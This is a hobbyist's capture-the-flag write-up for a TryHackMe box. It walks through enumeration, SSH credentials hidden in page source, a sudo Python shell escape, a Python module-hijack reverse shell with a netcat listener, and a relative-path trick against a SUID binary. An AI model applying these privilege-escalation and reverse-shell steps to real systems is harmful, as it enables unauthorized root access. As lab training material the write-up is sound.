 This was a tryhackme CTF

 - I started with regular nmap enumaration and found http and ssh were running
 - Going to the website adn viewing source, I foud the img directory
 - Three images were in the directory, so I downloaded all three and ran steg checks with `https://futureboy.us/stegano/decinput.html`
 - The only one with info was the white rabbit picture, with resulted in this:
```
follow the r a b b i t
```
- I had previously run gobuster to enumerate subdirectories and found the directory `/r`
```shell
# command
gobuster dir -u <http://IP> -w /usr/share/dirb/wordlists/common.txt
```
- Following the rabbit logic, I nagivated to `/r/a/b/b/i/t` (there were quotes on each page)
- Viewing source on the `/t` page, I foud an interesting line
```html
<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
```
- I tried logging in to ssh using the username `alice` and `HowDothTheLittleCrocodileImproveHisShiningTail` as the password (it worked!)
- Listing out files, I found a `root.txt` file and a python script
- I ran `nano` on the python script, which turnedout out to be a poem that just output random lines when run
- `sudo -l` showed that alice had root privileges for python on that specific file, so I decided ot exploit that
- I went to my fav place for priv escelation scripts, `gtfobins` and found one for python
- I modified it like this, but it can only be used with that specific file so I ended up stuck for a bit
```python
sudo python3 -c 'import os; os.system("/bin/sh")'
```
- I decided to work on finding `user.txt` which ended up being it the root directory (for whatever reason) so I got that with `cat /root/user.txt`
- Looking at the python script again, I noticed that it imported the random module to run. I had to do some reasearch, but it turns out this can be exploited
- If we create a python script called `random.py` this will be imported into the python script befor ehte actual random module, which means we can get a reverse shell
```python
# script
```
- then we sut up a listener on port 7777
```shell
nc -lvnp 7777
```
- and deploy
```shell
sudo -u rabbit /usr/bin/python3.6 /home/alice/nameofthepscriptimlazy
```
- Navigating into `/home/rabbit` there is a suid file called `teaParty`
- Running it outputs this:
```
Probably by Wed, 13 Dec 2023 02:10:07 +0000

Welcome to the tea party!
The Mad Hatter will be here soon.
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped)
```
- I copied it over to my system `scp teaParty > isabelle@<attack machine IP>`
- Similar to the python script, it has a relative call, this time to `date`
- So we employ similar tactics


